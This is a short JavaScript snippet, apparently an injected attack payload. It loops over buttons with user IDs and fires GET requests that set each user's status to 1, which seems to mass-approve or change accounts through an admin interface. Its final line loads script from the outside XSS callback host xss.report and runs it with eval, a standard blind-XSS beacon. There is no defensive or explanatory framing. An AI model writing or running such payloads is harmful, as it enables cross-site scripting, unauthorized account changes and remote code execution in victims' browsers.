const buttons = document.querySelectorAll('button[data-id]');

buttons.forEach(async (btn) => {
    const userId = btn.dataset.id;
    const username = btn.dataset.username || '';

    const url =
        `?vusername=${encodeURIComponent(username)}&vuserid=${userId}&vstatus=1&valasan=x`;

    try {
        const response = await fetch(url);

        console.log(
            `User ${userId} diproses`,
            response.status
        );
    } catch (err) {
        console.error(
            `Gagal memproses ${userId}`,
            err
        );
    }
});

function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/metoolze");a.send();
